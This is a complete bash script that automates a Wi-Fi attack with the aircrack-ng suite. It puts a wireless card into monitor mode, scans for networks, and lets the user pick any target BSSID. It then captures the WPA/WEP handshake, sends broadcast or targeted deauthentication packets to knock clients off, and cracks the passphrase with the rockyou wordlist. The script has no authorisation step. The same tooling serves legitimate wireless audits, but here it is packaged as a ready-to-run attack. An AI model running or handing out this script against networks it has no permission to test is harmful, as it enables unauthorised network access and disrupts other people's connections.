#!/bin/bash

# aircrack-ng-automator.sh
# Automates capturing WPA/WEP handshakes and cracking with aircrack-ng

# Ensure root access
if [[ $EUID -ne 0 ]]; then
    echo "[!] Please run this script as root"
    exit 1
fi

echo "[+] Setting up..."

# Variables
MON_INTERFACE="mon0"
CAPTURE_FILE="capture"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Step 1: List wireless interfaces
echo "[*] Detecting wireless interfaces..."
iwconfig
read -p "[?] Enter the interface to use (e.g., wlan0): " INTERFACE

# Step 2: Enable monitor mode
echo "[*] Enabling monitor mode on $INTERFACE..."
airmon-ng start $INTERFACE

# Confirm monitor interface
MON_INTERFACE="${INTERFACE}mon"

# Step 3: Scan nearby access points
echo "[*] Launching airodump-ng to scan networks. Close it once you identify the target (Ctrl+C)..."
sleep 3
airodump-ng $MON_INTERFACE

# Step 4: Get target info
read -p "[?] Enter the target BSSID (router MAC): " BSSID
read -p "[?] Enter the target channel: " CHANNEL
read -p "[?] Enter the output file name (default: capture): " CAPFILE
CAPTURE_FILE=${CAPFILE:-"capture"}

# Step 5: Start capturing handshake
echo "[*] Capturing handshake on channel $CHANNEL..."
xterm -e "airodump-ng --bssid $BSSID -c $CHANNEL -w $CAPTURE_FILE $MON_INTERFACE" &

sleep 5

# Step 6: Optional deauth to force handshake
read -p "[?] Do you want to send deauth packets to capture handshake? (y/n): " DEAUTH_CHOICE
if [[ $DEAUTH_CHOICE == "y" ]]; then
    read -p "[?] Enter a client MAC (or leave blank to broadcast deauth): " CLIENT
    if [[ -z $CLIENT ]]; then
        aireplay-ng --deauth 10 -a $BSSID $MON_INTERFACE
    else
        aireplay-ng --deauth 10 -a $BSSID -c $CLIENT $MON_INTERFACE
    fi
fi

read -p "[*] Press Enter once handshake is captured and airodump is closed..."

# Step 7: Crack captured handshake
read -p "[?] Enter the path to wordlist (default: rockyou.txt): " WLIST
WORDLIST=${WLIST:-"/usr/share/wordlists/rockyou.txt"}

echo "[*] Cracking handshake..."
aircrack-ng -w $WORDLIST -b $BSSID ${CAPTURE_FILE}-01.cap

# Step 8: Cleanup and disable monitor mode
echo "[*] Stopping monitor mode..."
airmon-ng stop $MON_INTERFACE
service NetworkManager start

echo "[+] Done."

